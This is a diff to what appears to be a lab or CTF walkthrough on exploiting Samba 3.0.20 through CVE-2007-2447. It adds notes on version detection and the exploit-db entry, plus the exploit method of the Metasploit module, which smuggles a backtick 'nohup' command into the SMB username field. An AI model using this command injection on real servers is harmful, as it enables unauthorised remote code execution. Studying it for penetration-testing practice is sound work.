@@ -160,7 +160,7 @@ class Metasploit3 < Msf::Exploit::Remote
 
 #### samba
 
-There is a well-known CVE for samba in 2007 which is [2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447). Let's explore a bit more with searchsploit to understand it better.
+We know that the samba version it runs on the target machine based on the nmap scan - "Samba smbd 3.0.20-Debian". There is a well-known CVE for samba in 2007 which is [2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447). Let's explore a bit more with searchsploit to understand it better.
 
 ```bash
 searchsploit samba 2007
@@ -179,7 +179,7 @@ Shellcodes: No Results
 Papers: No Results
 ```
 
-Based on the Google results of that CVE, I have found an entry on exploit-db.com - https://www.exploit-db.com/exploits/16320 which describes as "Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)". Let's delve in a bit more into the exploit. 
+Based on the Google results of that CVE, I have found an entry on exploit-db.com - https://www.exploit-db.com/exploits/16320 which describes as "Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)". Let's delve in a bit more into the exploit. It affects the samba version 3.0.20 to 3.0.25rc3 so it could be the best bet to mark it a potential attack vector. 
 
 ```bash
 searchsploit -x 16320
@@ -226,4 +226,21 @@ class Metasploit3 < Msf::Exploit::Remote
                                         [ 'CVE', '2007-2447' ],
                                         [ 'OSVDB', '34700' ],
 # More Ruby Code HERE.....
+def exploit
+
+                connect
+
+                # lol?
+                username = "/=`nohup " + payload.encoded + "`"
+                begin
+                        simple.client.negotiate(false)
+                        simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
+                rescue ::Timeout::Error, XCEPT::LoginError
+                        # nothing, it either worked or it didn't ;)
+                end
+
+                handler
+        end
+
+end
 ```
